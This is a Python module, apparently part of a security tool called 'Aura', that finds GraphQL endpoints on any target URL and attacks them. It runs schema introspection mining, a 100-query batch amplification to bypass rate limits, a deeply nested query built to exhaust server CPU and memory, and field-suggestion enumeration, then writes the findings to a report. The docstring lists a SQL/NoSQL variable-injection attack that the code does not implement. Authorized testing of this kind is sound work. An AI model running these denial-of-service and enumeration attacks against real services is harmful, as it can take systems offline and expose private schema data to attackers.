# -*- coding: utf-8 -*-
"""
Aura v32.0 — GraphQL Breaker 🕸️
================================
Advanced GraphQL security testing engine designed to break schemas and infrastructure.

Attacks Implemented:
  1. Introspection Mining — Full schema extraction and analysis.
  2. Batch Amplification — Sending 1000s of heavy queries to bypass Rate Limits / trigger DoS.
  3. Query Depth Exhaustion (Circular Queries) — Causes catastrophic server slowdown.
  4. Field Suggestion Abuse — Enumeration of hidden fields/types.
  5. Variable Injection — SQL/NoSQL payloads inside strictly typed variables.
"""
import asyncio
import json
import re
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse

import httpx

from aura.ui.formatter import console

GRAPHQL_PATHS = [
    "/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql",
    "/gql", "/query", "/api/query", "/graphql/v1",
    "/graphql/console", "/graphiql", "/playground",
    "/api", "/api/v1", "/api/v2",
]

INTROSPECTION_QUERY = {
    "query": """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        types {
          name
          kind
          fields { name type { name kind ofType { name kind } } }
        }
      }
    }
    """
}

# Malicious deeply nested query to trigger Resource Exhaustion (DoS)
CIRCULAR_DEPTH_QUERY = {
    "query": """
    query DepthAttack {
      __schema {
        types {
          fields {
            type {
              fields {
                type {
                  fields {
                    type {
                      name
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    """
}

FIELD_SUGGESTION_QUERY = {"query": "{ usr { id emai passwrd secret tok role } }"}


class GraphQLBreaker:
    """v32.0: Advanced GraphQL Attack Engine."""

    def __init__(self, target: str, timeout: int = 15):
        if not target.startswith("http"):
            target = "https://" + target
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.findings: list[dict] = []
        self.tested_endpoints = set()

    # ── Endpoint Discovery ────────────────────────────────────────────────
    async def _find_graphql_endpoint(self, client: httpx.AsyncClient) -> str | None:
        """Finds the GraphQL endpoint by pinging common paths."""
        for path in GRAPHQL_PATHS:
            url = f"{self.target}{path}"
            if url in self.tested_endpoints:
                continue
            try:
                r = await client.post(url, json={"query": "{ __typename }"}, timeout=8)
                if r.status_code in (200, 400) and ("data" in r.text or "__typename" in r.text or "errors" in r.text):
                    console.print(f"[bold cyan][🕸️ GraphQL] Endpoint Found: {url}[/bold cyan]")
                    self.tested_endpoints.add(url)
                    return url
            except httpx.RequestError:
                continue
        return None

    # ── Attack 1: Introspection Mining ────────────────────────────────────
    async def _introspection_attack(self, client: httpx.AsyncClient, endpoint: str) -> dict | None:
        """Detects if full introspection is enabled and extracts the schema."""
        try:
            r = await client.post(endpoint, json=INTROSPECTION_QUERY, timeout=12)
            if r.status_code == 200 and "__schema" in r.text:
                data = r.json()
                schema = data.get("data", {}).get("__schema", {})
                types = schema.get("types", [])
                
                user_types = [t["name"] for t in types if t.get("name") and not t["name"].startswith("__")]
                mutations = schema.get("mutationType")
                
                impact = f"Full schema extracted! Found {len(user_types)} custom types."
                if mutations:
                    impact += f" Migrations enabled! (Hackers can modify data)."

                return {
                    "type": "GraphQL Introspection Enabled",
                    "finding_type": "GraphQL Information Exposure",
                    "severity": "HIGH",
                    "owasp": "A01:2021 – Broken Access Control",
                    "mitre": "T1590 – Gather Victim Network Information",
                    "content": (
                        f"GraphQL Introspection exposed on {endpoint}\n"
                        f"Custom Types: {', '.join(user_types[:15])}...\n"
                        f"{impact}"
                    ),
                    "url": endpoint,
                    "confirmed": True,
                }
        except (httpx.RequestError, ValueError):
            pass
        return None

    # ── Attack 2: Batch Amplification (Rate Limit Bypass / DoS) ───────────
    async def _batch_attack(self, client: httpx.AsyncClient, endpoint: str) -> dict | None:
        """Sends an array of queries in a single HTTP request to bypass rate limits."""
        # A heavy query multiplied 100 times.
        batch = [{"query": "query { __schema { types { name } } }"}] * 100
        try:
            r = await client.post(endpoint, json=batch, timeout=15)
            # If server returns a list of responses, batching is enabled!
            if r.status_code == 200 and isinstance(r.json(), list) and len(r.json()) > 1:
                return {
                    "type": "GraphQL Batch Query Amplification",
                    "finding_type": "GraphQL Batch Amplification (DoS / Rate Limit Bypass)",
                    "severity": "HIGH",
                    "owasp": "A05:2021 – Security Misconfiguration",
                    "mitre": "T1499 – Endpoint Denial of Service",
                    "content": (
                        f"GraphQL Query Batching Enabled on {endpoint}\n"
                        f"Successfully executed 100 heavy queries in a SINGLE HTTP request.\n"
                        f"Impact: Attackers can completely bypass WAF/Rate Limits to brute-force OTPs or cause Server DoS."
                    ),
                    "url": endpoint,
                    "confirmed": True,
                }
        except (httpx.RequestError, ValueError):
            pass
        return None

    # ── Attack 3: Query Depth / Circular Reference Exhaustion ─────────────
    async def _depth_attack(self, client: httpx.AsyncClient, endpoint: str) -> dict | None:
        """Executes a deeply nested circular query to exhaust server CPU/RAM."""
        try:
            start_time = asyncio.get_event_loop().time()
            r = await client.post(endpoint, json=CIRCULAR_DEPTH_QUERY, timeout=20)
            elapsed = asyncio.get_event_loop().time() - start_time
            
            # If the request took longer than 6 seconds and returned 200/500, it struggled to parse it.
            # If it returned an error about "max depth exceeded", it is protected.
            
            if "max depth" in r.text.lower() or "too deep" in r.text.lower():
                return None # Protected
                
            if r.status_code in (200, 500, 502, 503, 504) and elapsed >= 6.0:
                return {
                    "type": "GraphQL Query Depth Exhaustion (DoS)",
                    "finding_type": "Application Denial of Service",
                    "severity": "CRITICAL",
                    "owasp": "A05:2021 – Security Misconfiguration",
                    "mitre": "T1499.004 – Application Exhaustion Flood",
                    "content": (
                        f"Server vulnerable to nested/circular GraphQL Queries on {endpoint}\n"
                        f"A deeply nested query took {elapsed:.2f} seconds to process.\n"
                        f"Impact: A single attacker can freeze the backend CPU/RAM entirely by sending 10 of these."
                    ),
                    "url": endpoint,
                    "confirmed": True,
                }
        except httpx.RequestError:
            pass
        return None

    # ── Attack 4: Field Suggestion Leakage ────────────────────────────────
    async def _field_suggestion_attack(self, client: httpx.AsyncClient, endpoint: str) -> dict | None:
        """Intentionally errors out to force the API to suggest hidden fields."""
        try:
            r = await client.post(endpoint, json=FIELD_SUGGESTION_QUERY, timeout=10)
            if r.status_code in (200, 400):
                # Look for hints like: Cannot query field "usr" on type "Query". Did you mean "user", "users"?
                suggestions = re.findall(r'Did you mean[^?.]+[?.]', r.text)
                if suggestions:
                    hidden_fields = re.findall(r'"([a-zA-Z0-9_]+)"', " ".join(suggestions))
                    return {
                        "type": "GraphQL Field Enumeration (Suggestion Abuse)",
                        "finding_type": "GraphQL Information Disclosure",
                        "severity": "MEDIUM",
                        "owasp": "A01:2021 – Broken Access Control",
                        "mitre": "T1590",
                        "content": (
                            f"GraphQL verbose errors leak hidden schema fields on {endpoint}\n"
                            f"Discovered Private Fields: {', '.join(set(hidden_fields))}\n"
                            f"Example Verbose Error: {suggestions[0]}"
                        ),
                        "url": endpoint,
                        "confirmed": True,
                    }
        except httpx.RequestError:
            pass
        return None

    # ── Main Scanner Logic ──────────────────────────────────────────────
    async def run(self) -> list:
        console.print(f"\n[bold magenta]🕸️ AURA v32.0 — GraphQL Breaker[/bold magenta]")
        console.print(f"🎯 Target: {self.target}")

        async with httpx.AsyncClient(verify=False, follow_redirects=True, headers={"Content-Type": "application/json"}) as client:
            endpoint = await self._find_graphql_endpoint(client)
            
            if not endpoint:
                console.print(f"[dim yellow]⚠️ No GraphQL endpoint discovered on {self.target}[/dim yellow]")
                return []

            console.print(f"  [cyan]Launching Breaker Engine against {endpoint}...[/cyan]")
            
            # Execute attacks concurrently
            tasks = await asyncio.gather(
                self._introspection_attack(client, endpoint),
                self._batch_attack(client, endpoint),
                self._depth_attack(client, endpoint),
                self._field_suggestion_attack(client, endpoint),
                return_exceptions=True
            )

            for result in tasks:
                if isinstance(result, Exception):
                    console.print(f"[dim red]Task failed: {result}[/dim red]")
                elif result and isinstance(result, dict):
                    sev = result.get("severity", "HIGH")
                    color = "red" if sev == "CRITICAL" else "yellow"
                    console.print(f"     🚨 [{color}]{result['type']}[/{color}] Confirmed!")
                    self.findings.append(result)

        self._finalize_report()
        return self.findings

    def _finalize_report(self):
        if self.findings:
            reports_dir = Path("./reports")
            reports_dir.mkdir(exist_ok=True)
            target_slug = urlparse(self.target).netloc.replace(".", "_")
            out_path = reports_dir / f"graphql_findings_{target_slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            
            with open(out_path, "w", encoding="utf-8") as f:
                json.dump({
                    "target": self.target,
                    "scan_time": datetime.utcnow().isoformat(),
                    "findings": self.findings
                }, f, indent=2)
            console.print(f"\n  💾 Findings saved: {out_path}")
        else:
            console.print(f"\n  ✅ GraphQL Implementation appears secure.")


def run_graphql_scan(target: str):
    """CLI runner for direct execution."""
    engine = GraphQLBreaker(target=target)
    return asyncio.run(engine.run())

if __name__ == "__main__":
    import sys
    url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    run_graphql_scan(url)
